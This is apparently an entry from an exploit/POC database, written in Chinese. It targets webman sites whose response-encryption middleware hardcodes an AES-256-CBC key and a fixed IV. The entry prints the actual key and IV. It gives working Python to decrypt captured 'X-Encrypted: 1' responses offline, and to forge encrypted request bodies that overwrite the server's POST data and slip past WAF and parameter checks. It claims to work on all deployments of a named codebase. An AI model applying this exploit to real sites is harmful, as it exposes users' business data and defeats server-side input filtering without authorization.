# webman 响应加密（X-Encrypted: 1）硬编码 AES 密钥解密 / 加密请求体构造

- **code**: webman-响应加密-x-encrypted-1-硬编码-aes-密钥解密-加密请求体构造
- **kind**: script
- **category**: frontend-reverse
- **component**: webman 2.x + app\Utils\Crypto
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com 实测：GET /api/index/config 零凭证返回 X-Encrypted:1 的 64B 密文，用该 key/iv 解密成功；批量解密 26 个自动路由接口响应全部成功。asset_target=https://example.com/api/index/config
- **path**: pocs/webman-响应加密-x-encrypted-1-硬编码-aes-密钥解密-加密请求体构造/webman_xencrypted_bypass.py
- **tags**: webman,响应加密,X-Encrypted,AES-256-CBC,硬编码密钥,固定IV
- **created_at**: 2026-10-12T11:29:54.575Z
- **found_by**: exploit

## 描述

webman 项目响应加密中间件（X-Encrypted: 1）的通用解密/加密方法。Crypto 类硬编码 AES-256-CBC key/iv 且固定 IV，导致全站加密响应可离线解密；并可用其构造加密请求体覆盖 $request->post。

## 用法

```
1) 抓到 X-Encrypted: 1 的响应，取其 body；2) python st_crypto.py '<base64>' 直接得明文；3) 需要发加密请求时用 enc({...}) 生成 body，加 header X-Encrypted: 1。已验证目标：GET https://example.com/api/index/config → 解密得 {"code":0,"sign":true,"message":"ok","data":[]}。
```

## 正文

```
## 1. 识别特征
响应头出现 `X-Encrypted: 1` 且 `Content-Type: text/plain`，body 是纯 base64（长度无 `=` 填充或 1~2 个 `=`，解 base64 后长度为 16 的倍数）。
含义：该 webman 项目开启了响应加密中间件（`app/middleware/EncryptionMiddleware.php`，由 `config('app.encryption_enabled')` 控制）。

## 2. 原理
```php
// app/middleware/EncryptionMiddleware.php
$data = json_decode($content, true);
if ($data !== null) {
    $encrypted = Crypto::encrypt($data);
    return new Response(200, ['Content-Type' => 'text/plain', 'X-Encrypted' => '1'], $encrypted);
}
// app/Utils/Crypto.php（硬编码，未走 .env，故交付版也不会改）
private static $key = 'QD2024SecretKey1234567890ABCDEF0';
private static $iv  = 'QD2024IV12345678';
// openssl_encrypt($json, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv) -> base64_encode
```
固定 IV + 硬编码密钥 => 任何拿到密文的人都能离线解出完整业务数据。

## 3. 解密（Python）
```python
import base64, json
from Crypto.Cipher import AES
KEY = b"QD2024SecretKey1234567890ABCDEF0"
IV  = b"QD2024IV12345678"
def dec(b64):
    raw = base64.b64decode(b64)
    d = AES.new(KEY, AES.MODE_CBC, IV).decrypt(raw)
    p = d[-1]
    if 1 <= p <= 16: d = d[:-p]
    return json.loads(d.decode())
```

## 4. 加密请求体（可覆盖服务端 $request->post）
```python
def enc(obj):
    raw = json.dumps(obj, ensure_ascii=False).encode()
    raw += bytes([16 - len(raw) % 16]) * (16 - len(raw) % 16)
    return base64.b64encode(AES.new(KEY, AES.MODE_CBC, IV).encrypt(raw)).decode()
# 用法：POST 目标，Headers: X-Encrypted: 1, body = enc({...})
# 中间件会把解密结果整体写入 $request->post，可用于绕过基于明文 body 的 WAF/参数检测
```

## 5. 通用性
同一套源码（GitHub `axq-devops/boyue`，交付版仅加了 403 功能开关与验证码补丁，**Crypto 未改**）部署的站点均适用。
遇到 `X-Encrypted: 1` 先试这组 key/iv；如失败，再从 `app/Utils/Crypto.php` 读取。

```
